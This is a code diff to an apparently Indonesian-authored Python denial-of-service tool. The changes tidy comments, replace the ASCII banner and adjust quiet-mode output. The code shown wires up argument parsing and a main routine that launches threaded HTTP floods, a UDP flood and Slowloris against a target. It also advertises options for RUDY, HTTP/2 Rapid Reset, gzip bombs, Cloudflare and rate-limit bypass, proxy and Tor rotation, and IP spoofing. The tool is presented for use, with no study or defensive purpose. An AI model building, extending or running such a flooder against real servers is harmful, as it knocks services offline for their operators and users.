@@ -2,7 +2,6 @@
 # -*- coding: utf-8 -*-
 
 import sys
-import os
 import time
 import random
 import string
@@ -11,9 +10,11 @@ import threading
 import argparse
 import signal
 import urllib.parse
+from collections import defaultdict
+
+# Nonaktifkan peringatan SSL/TLS
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-from collections import defaultdict
 
 try:
     import requests
@@ -47,8 +48,8 @@ use_ratelimit = False
 use_random_ip = False
 use_pipeline = False
 use_keep_alive = True
-verbose = False          # untuk detail request
-quiet = False            # untuk menonaktifkan semua output non-statistik
+verbose = False
+quiet = False
 
 headers_referers = [
     "http://www.google.com/?q=",
@@ -336,7 +337,7 @@ def worker(target_url, host, data, headers, payload_size):
             if verbose and not quiet:
                 print(f"  ❌ Error: {e}")
 
-# ================ STATS PRINTER (hanya compact) ================
+# ================ STATS PRINTER (compact) ================
 def stats_printer(duration):
     while not stop_event.is_set():
         time.sleep(0.5)
@@ -350,24 +351,26 @@ def stats_printer(duration):
         remaining = max(0, duration - elapsed)
         remaining_str = format_duration(int(remaining))
 
-        # Hanya compact mode
         sys.stdout.write(f"\r ⏳{progress:5.1f}% ✅{success} ❌{failed} 📊{total} 🚀{rate:5.1f}/s ⏱{remaining_str}")
         sys.stdout.flush()
 
-# ================ MAIN ================
+# ================ BANNER ================
 def print_banner():
     banner = """
-    ════════════════════════════════════════════════════════════ 
-     [0;37;40m        [0;97;1;40m▐[0;93;1;43m▄▄▄▄▄▄[0;37;40m▌ [0;97;1;40m▐[0;93;1;43m▄▄[0;33;40m▌[0;37;40m [0;97;1;40m▐[0;93;1;43m▄▄[0;33;40m▌[0;97;1;40m▐[0;93;1;43m▄▄[0;37;40m▌[0;97;1;40m▐[0;93;1;43m▄▄[0;37;40m▌ [0;97;1;40m▐[0;93;1;43m▄▄[0;33;40m▌[0m
-     [0;37;40m        [0;97;1;40m▐[0;93;1;40m██[0;33;40m▌[0;37;40m [0;97;1;40m▐[0;93;1;40m██[0;33;40m▌[0;97;1;40m▐[0;93;1;40m██[0;33;40m▌[0;37;40m [0;97;1;40m▐[0;93;1;40m██[0;33;40m▌[0;97;1;40m▐[0;93;1;40m██[0;37;40m▌[0;97;1;40m▐[0;93;1;40m██[0;37;40m▌ [0;97;1;40m▐[0;93;1;40m██[0;33;40m▌[0m
-     [0;37;40m        [0;97;1;40m▐[0;93;1;40m██[0;37;40m▌ [0;97;1;40m▐[0;93;1;40m██[0;37;40m▌[0;97;1;40m▐[0;93;1;40m██[0;37;40m▌ [0;97;1;40m▐[0;93;1;40m██[0;37;40m▌[0;97;1;40m▐[0;93;1;40m██[0;33;40m▌[0;37;40m [0;97;1;40m▐[0;93;1;40m██████[0;33;40m▌[0m
-     [0;37;40m        [0;91;1;40m▐[0;97;1;40m▀▀[0;31;40m▌[0;37;40m [0;91;1;40m▐[0;97;1;40m▀▀[0;31;40m▌[0;91;1;40m▐[0;97;1;40m▀▀[0;31;40m▌[0;37;40m [0;91;1;40m▐[0;97;1;40m▀▀[0;37;40m [0;91;1;40m▐[0;97;1;40m▀▀[0;31;40m▌[0;37;40m     [0;91;1;40m▐[0;97;1;40m▀▀[0;31;40m▌[0m
-     [0;37;40m        [0;93;1;40m▐[0;91;1;41m▄▄[0;33;40m▌[0;37;40m [0;97;1;40m▐[0;91;1;41m▄▄[0;33;40m▌[0;37;40m [0;93;1;40m▐[0;91;1;41m▄▄▄▄▄[0;33;40m▌[0;37;40m [0;93;1;40m▐[0;91;1;41m▄▄[0;33;40m▌[0;93;1;40m▐[0;91;1;41m▄▄▄▄▄▄[0;33;40m▌[0;37;40m [0m     
+    ════════════════════════════════════════════════════════════
+            ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓██████▓▒░  
+            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░     
+            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░     
+            ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
     ════════════════════════════════════════════════════════════
     ════════════════════════════════════════════════════════════
     """
     print(banner)
 
+# ================ ARGUMEN ================
 def parse_args():
     global use_http2, use_udp, use_slowloris, use_rudy, use_gzip_bomb, use_proxy, use_tor
     global use_cloudflare, use_fingerprint, use_referer, use_ratelimit, use_random_ip
@@ -383,7 +386,7 @@ def parse_args():
     parser.add_argument('--data', help='Data to POST')
     parser.add_argument('--header', action='append', help='Custom header (key:value)')
 
-    parser.add_argument('--http2', action='store_true', help='Enable HTTP/2 Rapid Reset (not fully implemented in requests)')
+    parser.add_argument('--http2', action='store_true', help='Enable HTTP/2 Rapid Reset (not fully implemented)')
     parser.add_argument('--udp', action='store_true', help='Enable UDP flood')
     parser.add_argument('--slowloris', action='store_true', help='Enable Slowloris')
     parser.add_argument('--rudy', action='store_true', help='Enable RUDY')
@@ -400,7 +403,7 @@ def parse_args():
     parser.add_argument('--keep-alive', action='store_true', default=True, help='Keep-alive connections')
     parser.add_argument('--all', action='store_true', help='Enable ALL features')
     parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output (show each request)')
-    parser.add_argument('--quiet', action='store_true', help='Suppress all non-critical output (overrides -v)')
+    parser.add_argument('--quiet', action='store_true', help='Suppress non-essential output (banner & features still shown)')
     parser.add_argument('--version', action='store_true', help='Show version')
 
     args = parser.parse_args()
@@ -431,10 +434,11 @@ def parse_args():
     verbose = args.verbose
     quiet = args.quiet
 
-    # Jika quiet, matikan verbose
+    # Jika quiet, verbose di-override
     if quiet:
         verbose = False
 
+    # Load user agents
     if args.agents:
         try:
             with open(args.agents, 'r') as f:
@@ -448,9 +452,11 @@ def parse_args():
                 print(f" 📕 Can't load User-Agent list: {e}")
             sys.exit(1)
 
+    # Load proxies
     if use_proxy and args.proxy_file:
         load_proxies(args.proxy_file)
 
+    # Generate referers
     if use_referer:
         domains = ["google.com", "facebook.com", "youtube.com", "twitter.com", "instagram.com",
                    "linkedin.com", "reddit.com", "wikipedia.org", "amazon.com", "netflix.com",
@@ -461,6 +467,7 @@ def parse_args():
                 headers_referers.append(f"{protocol}://{domain}/search?q=")
                 headers_referers.append(f"{protocol}://{domain}/?q=")
 
+    # Check Tor
     if use_tor and not SOCKS_AVAILABLE:
         if not quiet:
             print(" ⚠️ pysocks not installed. Tor will be disabled.")
@@ -468,37 +475,39 @@ def parse_args():
 
     return args
 
+# ================ SIGNAL HANDLER ================
 def signal_handler(sig, frame):
     if not quiet:
         print("\n 📍 Stopped by user")
     stop_event.set()
 
+# ================ MAIN ================
 def main():
     args = parse_args()
-    if not quiet:
-        print_banner()
 
-    if not quiet:
-        print(f" 🎯 Target: {args.target}")
-        print(f" 💣 Threads: {args.threads}")
-        print(f" ⏱️  Duration: {args.duration}s")
-        print(f" 📦 Payload: {args.payload_size}MB")
-        print(" 📱 Compact mode: ON (no progress bar)")
-        print(f" 💎  Features:")
-        print(f"   ├─ HTTP/2 Rapid Reset: {use_http2}")
-        print(f"   ├─ UDP Flood: {use_udp}")
-        print(f"   ├─ Slowloris: {use_slowloris}")
-        print(f"   ├─ RUDY Attack: {use_rudy}")
-        print(f"   ├─ Gzip Bomb: {use_gzip_bomb}")
-        print(f"   ├─ Proxy Rotation: {use_proxy}")
-        print(f"   ├─ Tor: {use_tor}")
-        print(f"   ├─ Cloudflare Bypass: {use_cloudflare}")
-        print(f"   ├─ Fingerprint Spoof: {use_fingerprint}")
-        print(f"   ├─ Referer Spoof: {use_referer}")
-        print(f"   ├─ Rate Limit Bypass: {use_ratelimit}")
-        print(f"   ├─ Random IP: {use_random_ip}")
-        print(f"   └─ HTTP Pipelining: {use_pipeline}")
-        print("\n 🔥 SENDING THREAD 🚀🚀🚀......\n")
+    # Tampilkan banner dan informasi fitur SELALU (tidak dipengaruhi quiet)
+    print_banner()
+    print(f" 🎯 Target: {args.target}")
+    print(f" 💣 Threads: {args.threads}")
+    print(f" ⏱️  Duration: {args.duration}s")
+    print(f" 📦 Payload: {args.payload_size}MB")
+    print(" 📱 Compact mode: ON (no progress bar)")
+    print(f" 💎  Features:")
+    print(f"   ├─ HTTP/2 Rapid Reset: {use_http2}")
+    print(f"   ├─ UDP Flood: {use_udp}")
+    print(f"   ├─ Slowloris: {use_slowloris}")
+    print(f"   ├─ RUDY Attack: {use_rudy}")
+    print(f"   ├─ Gzip Bomb: {use_gzip_bomb}")
+    print(f"   ├─ Proxy Rotation: {use_proxy}")
+    print(f"   ├─ Tor: {use_tor}")
+    print(f"   ├─ Cloudflare Bypass: {use_cloudflare}")
+    print(f"   ├─ Fingerprint Spoof: {use_fingerprint}")
+    print(f"   ├─ Referer Spoof: {use_referer}")
+    print(f"   ├─ Rate Limit Bypass: {use_ratelimit}")
+    print(f"   ├─ Random IP: {use_random_ip}")
+    print(f"   └─ HTTP Pipelining: {use_pipeline}")
+
+    print("\n 🔥 SENDING THREAD 🚀🚀🚀......\n")
 
     # Start worker threads
     threads = []
@@ -514,14 +523,14 @@ def main():
         t.start()
         threads.append(t)
 
-    # Start UDP flood
+    # UDP flood
     if use_udp:
         host = urllib.parse.urlparse(args.target).netloc
         t_udp = threading.Thread(target=udp_flood, args=(host,))
         t_udp.daemon = True
         t_udp.start()
 
-    # Start Slowloris
+    # Slowloris
     if use_slowloris:
         host = urllib.parse.urlparse(args.target).netloc
         t_slow = threading.Thread(target=slowloris_attack, args=(host,))
@@ -545,7 +554,7 @@ def main():
         pass
 
     stop_event.set()
-    time.sleep(1)  # beri waktu thread berhenti
+    time.sleep(1)
 
     # Final stats
     elapsed = time.time() - stats['start_time']
@@ -555,7 +564,6 @@ def main():
         total = stats['total']
         status_codes = stats['status_codes']
 
-    # Selalu tampilkan hasil akhir (tidak dipengaruhi quiet)
     print("\n\n 🎯 ATTACK FINISHED")
     print(f" 📗 Success: {success}")
     print(f" 📕 Failed: {failed}")
